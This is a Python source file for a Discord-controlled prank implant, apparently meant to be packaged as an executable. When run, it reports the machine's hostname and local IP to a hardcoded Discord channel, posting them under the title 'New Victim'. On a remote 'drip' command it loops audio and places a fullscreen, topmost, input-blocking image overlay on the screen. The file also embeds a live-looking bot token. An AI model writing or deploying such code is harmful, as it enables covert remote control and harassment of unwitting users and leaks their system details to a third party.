import sys, os
import socket
import discord
from discord.ext import commands
import threading
from playsound import playsound
from time import sleep
import tkinter
from tkinter import *
from PIL import Image, ImageTk

def getResourcePath(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def audio():
    while True:
        playsound(getResourcePath('drip.mp3'))

def window():
    root = Tk()
    root.attributes('-fullscreen',True)

    image = Image.open(getResourcePath('drip.png'))
    test = ImageTk.PhotoImage(image)

    label = tkinter.Label(image=test)
    label.image = test

    root.wm_attributes("-topmost", True)
    root.wm_attributes("-disabled", True)
    root.wm_attributes("-transparentcolor", "white")
    root.configure(bg='white')
    label.configure(bg='white')
    label.place(x=960-(image.width/2), y=575-(image.height/2))
    #sleep(0.5)
    root.mainloop()

def start_bot():

    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    bot = commands.Bot(command_prefix=hostname+"!")

    @bot.event
    async def on_ready():
        embed = discord.Embed(title="New Victim")
        embed.add_field(name="Hostname:",value=hostname)
        embed.add_field(name="Local IP:",value=local_ip)
        channel = bot.get_channel(820040602649493524)
        await channel.send(embed=embed)

    @bot.command()
    async def drip(ctx):
        a = threading.Thread(target=audio)
        win = threading.Thread(target=window)
        a.start()
        win.start()
        await ctx.send(f"Drip activated on: {hostname}")

    bot.run("ODIwMDMxMTcyNDgyMDM5ODkw.YEvPig.yjUcPwpvTQGaXxUnrfxJWuij2DY")

start_bot()